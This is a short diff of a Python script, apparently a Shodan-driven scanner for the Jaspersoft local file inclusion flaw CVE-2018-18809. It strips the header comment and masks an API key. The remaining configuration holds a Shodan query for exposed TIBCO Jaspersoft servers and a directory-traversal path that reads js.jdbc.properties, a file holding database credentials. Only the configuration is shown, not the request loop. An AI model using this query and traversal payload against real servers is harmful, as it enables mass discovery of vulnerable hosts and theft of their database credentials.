@@ -1,10 +1,3 @@
-#!/usr/bin/env python
-#
-# jaspersoft.py
-# Search SHODAN for Jaspersoft LFI CVE-2018-18809
-#
-# Author: random_robbie
-
 import shodan
 import sys
 import re
@@ -14,7 +7,7 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOURAPIKEY"
+API_KEY = "****"
 SEARCH_FOR = 'title:"TIBCO Jaspersoft:" port:"443" 1970"'
 FILE = "/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../js.jdbc.properties"
 session = requests.Session()
